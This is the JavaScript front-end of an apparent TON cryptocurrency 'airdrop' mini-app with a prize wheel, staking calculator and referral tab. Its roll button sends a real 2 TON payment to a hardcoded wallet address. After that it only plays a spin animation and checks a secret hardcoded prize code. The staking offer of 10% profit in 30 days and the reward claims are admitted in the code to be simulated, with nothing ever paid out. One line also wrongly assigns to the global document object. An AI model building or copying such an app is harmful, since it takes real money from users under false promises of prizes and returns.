document.addEventListener('DOMContentLoaded', () => {
    const startScreen = document.querySelector('.start-screen');
    const page = document.querySelector('.page');
    const headerBurger = document.querySelector('.header__burger');
    const headerNav = document.querySelector('.header__nav');
    const bottomNavTabs = document.querySelectorAll('.bottom-nav li');
    const sectionContents = document.querySelectorAll('.section-content');

    // --- 1. Start Screen Logic ---
    startScreen.classList.add('active'); // Ensure active class is set for animation
    setTimeout(() => {
        startScreen.classList.add('fade-out');
        startScreen.addEventListener('animationend', () => {
            startScreen.classList.add('hide');
            page.classList.remove('hide');
        }, { once: true });
    }, 3000); // Show loading for 3 seconds

    // --- 2. Header Burger Menu Toggle ---
    headerBurger.addEventListener('click', () => {
        headerBurger.classList.toggle('active');
        headerNav.classList.toggle('active');
    });

    // --- 3. Bottom Navigation Tab Switching ---
    // Set initial active section to Rolls
    document.getElementById('content-rolls').classList.add('active-section');
    bottomNavTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            // Haptic Feedback for tab clicks
            if (navigator.vibrate) {
                navigator.vibrate(50); // Short subtle vibration
            }

            const targetSectionId = tab.dataset.section;

            // Remove active class from all tabs and sections
            bottomNavTabs.forEach(t => t.classList.remove('active'));
            sectionContents.forEach(s => {
                s.classList.remove('active-section');
                s.classList.add('hidden-section');
            });

            // Add active class to clicked tab
            tab.classList.add('active');

            // Show the target section
            const targetSection = document.getElementById(`content-${targetSectionId}`);
            if (targetSection) {
                targetSection.classList.remove('hidden-section');
                targetSection.classList.add('active-section');
            }
        });
    });

    // --- 4. TON Connect Wallet & Rolls Logic ---
    const rollsInfoText = document.querySelector('.rolls-info-text');
    const connectWalletBtnRolls = document.getElementById('connectWalletBtnRolls'); // Custom button
    const payForRollsBtn = document.getElementById('payForRollsBtn'); // Custom button
    const codeEntrySection = document.querySelector('.code-entry-section');
    const confirmationCodeInput = document.getElementById('confirmationCodeInput');
    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
    const codeErrorMessage = document.getElementById('codeErrorMessage');
    const referralAfterCodeMessage = document.querySelector('.referral-after-code-message');
    const loadingAnimation = document.querySelector('.loading-animation');
    const checkmarkAnimation = document.querySelector('.checkmark-animation');
    const spinningWheel = document = document.querySelector('.spinning-wheel');

    let isWalletConnected = false; // Track connection status
    let tonConnectUI; // Declare globally or in a scope accessible by init

    // Set initial button states on DOMContentLoaded
    connectWalletBtnRolls.disabled = false; // Connect is enabled initially
    payForRollsBtn.disabled = true; // Pay is disabled initially

    // Initialize TON Connect UI -- NO buttonRootId --
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
    });

    // Listen for TonConnectUI status changes
    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            isWalletConnected = true;
            rollsInfoText.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Now, pay 2 TON to roll!`;
            connectWalletBtnRolls.disabled = true; // Disable connect button
            payForRollsBtn.disabled = false; // Enable pay button
            
            // Hide code entry/referral if wallet connects (reset state)
            codeEntrySection.classList.add('hide');
            referralAfterCodeMessage.classList.add('hide');

        } else {
            isWalletConnected = false;
            rollsInfoText.textContent = 'Connect your TON wallet to participate.';
            connectWalletBtnRolls.disabled = false; // Enable connect button
            payForRollsBtn.disabled = true; // Disable pay button
            codeEntrySection.classList.add('hide');
            referralAfterCodeMessage.classList.add('hide');
        }
    });

    // Custom Connect Wallet Button Click
    connectWalletBtnRolls.addEventListener('click', async () => {
        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
        try {
            await tonConnectUI.openModal(); // Open the TonConnectUI modal
        } catch (e) {
            console.error('Wallet connection failed:', e);
            rollsInfoText.textContent = 'Wallet connection failed. Please try again.';
        }
    });

    // Custom Pay 2 TON & Roll Button Click
    payForRollsBtn.addEventListener('click', async () => {
        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
        if (!isWalletConnected) {
            rollsInfoText.textContent = 'Please connect your wallet first!';
            return;
        }

        // Disable pay button to prevent multiple clicks during transaction
        payForRollsBtn.disabled = true; 

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
            messages: [
                {
                    address: 'UQD8J5QN9ygpY30_afh0pqnpmTVHePlt1WrTBg-otAUjDpNG', // Your specified wallet address for 2 TON
                    amount: '2000000000', // 2 TON in nanoton (2 * 10^9)
                },
            ],
        };

        try {
            // Send the transaction using TonConnectUI
            const result = await tonConnectUI.sendTransaction(transaction);
            console.log('Transaction successful:', result);
            
            // --- Execute success simulation after actual transaction is sent ---
            loadingAnimation.classList.remove('hide');
            rollsInfoText.classList.add('hide'); // Hide info text during loading
            
            // Spin the wheel
            spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
            spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`; // Spin 3+ times

            if (navigator.vibrate) { navigator.vibrate(100); } // Medium vibration for successful payment/spin

            setTimeout(() => {
                loadingAnimation.classList.add('hide');
                checkmarkAnimation.classList.remove('hide');
                rollsInfoText.classList.remove('hide'); // Show info text again
                rollsInfoText.textContent = 'Payment successful! Enter your code to claim your prize.';
                codeEntrySection.classList.remove('hide'); // Show code entry
                checkmarkAnimation.addEventListener('loopComplete', () => {
                    checkmarkAnimation.classList.add('hide');
                }, { once: true });
            }, 4000); // Simulate 4 seconds for spin + loading after successful transaction

        } catch (e) {
            console.error('Transaction failed:', e);
            rollsInfoText.textContent = 'Payment failed. Please try again.';
            loadingAnimation.classList.add('hide'); // Hide loading if it was shown
            payForRollsBtn.disabled = false; // Re-enable pay button on failure
        }
    });
    
    // Simulate code verification
    verifyCodeBtn.addEventListener('click', () => {
        const enteredCode = confirmationCodeInput.value.trim();
        codeErrorMessage.classList.add('hide'); // Hide previous errors
        
        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click

        if (enteredCode === '909986') { // Correct code
            codeEntrySection.classList.add('hide');
            referralAfterCodeMessage.classList.remove('hide');
            rollsInfoText.classList.add('hide'); // Hide previous info text
            // Optional: Disable further interaction or redirect
        } else {
            codeErrorMessage.classList.remove('hide');
            confirmationCodeInput.classList.add('error'); // Add error styling
            if (navigator.vibrate) { navigator.vibrate(150); } // Vibrate for error
            setTimeout(() => confirmationCodeInput.classList.remove('error'), 1500); // Remove error after a bit
        }
    });

    // --- 5. Staking Section Logic ---
    const stakingAmountInput = document.getElementById('stakingAmount');
    const estimatedProfitSpan = document.getElementById('estimatedProfit');
    const stakingFeeSpan = document.getElementById('stakingFee');
    const totalReturnSpan = document.getElementById('totalReturn');
    const stakeTonBtn = document.getElementById('stakeTonBtn');
    const learnMoreLink = document.querySelector('.learn-more-link');
    const learnMoreContent = document.querySelector('.learn-more-content');

    const STAKING_RATE_DAILY = 0.10 / 30; // 10% profit over 30 days, daily rate
    const FEE_RATE = 0.01; // 1% fee on total profit

    const updateStakingSummary = () => {
        const amount = parseFloat(stakingAmountInput.value);
        if (isNaN(amount) || amount <= 0) {
            estimatedProfitSpan.textContent = '0 TON';
            stakingFeeSpan.textContent = '0 TON';
            totalReturnSpan.textContent = '0 TON';
            stakeTonBtn.disabled = true;
            stakeTonBtn.style.opacity = '0.5';
            return;
        }
        stakeTonBtn.disabled = false;
        stakeTonBtn.style.opacity = '1';

        const estimatedTotalProfit = amount * STAKING_RATE_DAILY * 30; // Total profit for 30 days
        const stakingFee = estimatedTotalProfit * FEE_RATE;
        const totalReturn = amount + estimatedTotalProfit - stakingFee;

        estimatedProfitSpan.textContent = `${estimatedTotalProfit.toFixed(2)} TON`;
        stakingFeeSpan.textContent = `${stakingFee.toFixed(2)} TON`;
        totalReturnSpan.textContent = `${totalReturn.toFixed(2)} TON`;
    };

    stakingAmountInput.addEventListener('input', updateStakingSummary);
    updateStakingSummary(); // Initial calculation

    stakeTonBtn.addEventListener('click', () => {
        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click

        const amount = parseFloat(stakingAmountInput.value);
        if (isNaN(amount) || amount <= 0) {
            alert('Please enter a valid amount to stake.');
            return;
        }
        // Simulate staking transaction (no actual blockchain interaction here)
        alert(`Simulating staking of ${amount} TON. This would initiate a transaction in a real DApp.`);
        // In a real DApp, you would use tonConnectUI.sendTransaction here
    });

    learnMoreLink.addEventListener('click', (e) => {
        e.preventDefault();
        learnMoreContent.classList.toggle('hide');
        learnMoreLink.textContent = learnMoreContent.classList.contains('hide') ? 'Learn More About Staking' : 'Show Less';
        if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback for toggle
    });

    // --- 6. Earn Section Logic ---
    const referralLinkInput = document.getElementById('referralLink');
    const copyReferralBtn = document.querySelector('.copy-referral-btn');
    const claimRewardBtn = document.querySelector('.stat-value .claim-btn');

    copyReferralBtn.addEventListener('click', () => {
        referralLinkInput.select();
        referralLinkInput.setSelectionRange(0, 99999); // For mobile devices
        document.execCommand('copy');
        copyReferralBtn.textContent = 'Copied!';
        setTimeout(() => {
            copyReferralBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; // Reset button text
        }, 2000);
        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback
    });

    if (claimRewardBtn) {
        claimRewardBtn.addEventListener('click', () => {
            alert('Claiming rewards simulated! In a real DApp, this would initiate a withdrawal transaction.');
            if (navigator.vibrate) { navigator.vibrate(70); } // Haptic Feedback
        });
    }

    // Placeholder for dynamic user name in Earn section
    const earnUserName = document.querySelector('.earn-user-name');
    // You would typically get the Telegram username from Telegram Mini App API or a backend.
    // For now, it remains a static placeholder.
    // Example: if (window.Telegram.WebApp) earnUserName.textContent = `@${window.Telegram.WebApp.initDataUnsafe.user.username || 'TelegramUser'}`;


    // --- 7. Team Section Photo Interaction ---
    const teamPhotos = document.querySelectorAll('.team-photo');

    teamPhotos.forEach(photo => {
        photo.addEventListener('click', () => {
            if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback

            // Toggle elevated class for the clicked photo
            if (photo.classList.contains('elevated')) {
                photo.classList.remove('elevated');
                photo.classList.add('blurred');
            } else {
                // Remove elevated class from all other photos first
                teamPhotos.forEach(p => {
                    p.classList.remove('elevated');
                    p.classList.add('blurred');
                });
                photo.classList.remove('blurred');
                photo.classList.add('elevated');
            }
        });
    });

    // --- 8. Global Countdown Timer (Removed logic, now static) ---
    // The countdown element is now static in index.html, so no JavaScript is needed for it.
    // Removed: updateCountdown function and setInterval.
});
